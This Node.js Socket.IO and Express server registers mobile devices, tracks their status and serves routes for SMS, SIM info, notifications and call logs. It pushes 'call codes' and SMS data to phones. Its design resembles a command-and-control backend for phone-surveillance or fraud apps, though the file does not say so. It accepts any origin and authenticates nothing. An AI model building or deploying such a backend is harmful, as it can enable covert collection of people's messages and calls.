import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

app.use(cors());
app.use(express.json());
app.set("io", io);

// =============================================
// 🔥 DEVICE SOCKET STORAGE (Perfectly Stable)
// =============================================
const deviceSockets = new Map();        // deviceId → socketId
const watchers = new Map();             // deviceId → Set(socketId)

// =============================================
// 🔥 Function: Notify Device Details Page
// =============================================
function notifyWatchers(deviceId, payload) {
  const w = watchers.get(deviceId);
  if (!w) return;
  for (let sid of w) io.to(sid).emit("deviceStatusSingle", payload);
}

// =============================================
// 🔥 SOCKET CORE SYSTEM (Final Stable Version)
// =============================================
io.on("connection", (socket) => {
  console.log("🟢 New Socket Connected:", socket.id);

  let currentDeviceId = null;

  // ---------------------------------------------
  // 👁 Watch Single Device Page
  // ---------------------------------------------
  socket.on("watchDevice", (deviceId) => {
    if (!deviceId) return;

    if (!watchers.has(deviceId)) watchers.set(deviceId, new Set());
    watchers.get(deviceId).add(socket.id);

    console.log(`👁 Watching Device → ${deviceId}`);
  });

  // ---------------------------------------------
  // 📌 Unwatch
  // ---------------------------------------------
  socket.on("unwatchDevice", (deviceId) => {
    if (watchers.has(deviceId)) watchers.get(deviceId).delete(socket.id);
  });

  // ---------------------------------------------
  // 📌 REGISTER MOBILE DEVICE
  // ---------------------------------------------
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    console.log("🔗 REGISTER DEVICE:", uniqueid);

    // 🚫 DO NOT disconnect old socket! only replace ID.
    deviceSockets.set(uniqueid, socket.id);

    currentDeviceId = uniqueid;
    socket.join(uniqueid);

    saveLastSeen(uniqueid, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid });

    // 🔔 Notify device list page
    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid,
    });

    // 🔔 Notify device details page
    notifyWatchers(uniqueid, {
      uniqueid,
      connectivity: "Online",
      updatedAt: new Date(),
    });
  });

  // ---------------------------------------------
  // 🔵 DEVICE STATUS → Online / Offline
  // ---------------------------------------------
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ STATUS: ${uniqueid} → ${connectivity}`);

    saveLastSeen(uniqueid, connectivity);

    const payload = {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    };

    io.emit("deviceStatus", payload);
    notifyWatchers(uniqueid, payload);
  });

  // ---------------------------------------------
  // 🔴 DISCONNECT (Perfect FIX)
  // ---------------------------------------------
  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentDeviceId) {
      const latest = deviceSockets.get(currentDeviceId);

      // ❗ Only offline when THIS socket was the latest one
      if (latest === socket.id) {
        console.log("🛑 DEVICE OFFLINE:", currentDeviceId);

        deviceSockets.delete(currentDeviceId);
        saveLastSeen(currentDeviceId, "Offline");

        const payload = {
          uniqueid: currentDeviceId,
          connectivity: "Offline",
          updatedAt: new Date(),
        };

        io.emit("deviceStatus", payload);
        io.emit("deviceListUpdated", {
          event: "device_disconnected",
          uniqueid: currentDeviceId,
        });

        notifyWatchers(currentDeviceId, payload);
      }
    }

    // Remove from watchers
    for (let [id, set] of watchers.entries()) {
      set.delete(socket.id);
    }
  });
});

// =============================================
// 🔥 Save Last Seen (Online/Offline)
// =============================================
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;
    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.log("❌ LastSeen Error:", err.message);
  }
}

// =============================================
// 🔥 SEND CALL CODE TO DEVICE
// =============================================
export async function sendCallCodeToDevice(uniqueid, callData) {
  const socketId = deviceSockets.get(uniqueid);
  if (socketId && io.sockets.sockets.get(socketId)) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`📞 CallCode Sent → ${uniqueid}`);
  }
}

// =============================================
// 🔥 MONGO CHANGE STREAMS
// =============================================
mongoose.connection.once("open", () => {
  console.log("📡 Mongo Streams Active...");

  const watch = (collection, eventName, callback) => {
    const stream = mongoose.connection.collection(collection).watch();
    stream.on("change", async (change) => {
      if (!["insert", "update", "replace"].includes(change.operationType)) return;

      const updated = await mongoose.connection
        .collection(collection)
        .findOne({ _id: change.documentKey._id });

      if (updated) callback(updated);
    });
  };

  // Device Stream
  watch("devices", "deviceListUpdated", (data) => {
    io.emit("deviceListUpdated", { event: "db_change", device: data });
  });

  // SIM Stream
  watch("siminfos", "simInfoUpdated", (data) => {
    io.emit("simInfoUpdated", { event: "sim_change", sim: data });
  });

  // Call Stream
  watch("callcodes", "callCodeUpdate", (data) => {
    sendCallCodeToDevice(data.deviceId, data);
  });

  // SMS Stream
  watch("sms", "smsUpdate", (data) => {
    const sock = deviceSockets.get(data.deviceId);
    if (sock) io.to(sock).emit("smsUpdate", data);
  });
});

// =============================================
// ROUTES
// =============================================
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

// ROOT
app.get("/", (req, res) => res.send("🔥 Stable Socket Backend Running"));

// SERVER
const PORT = process.env.PORT || 5000;
server.listen(PORT, () =>
  console.log(`🚀 Server running at http://localhost:${PORT}`)
);
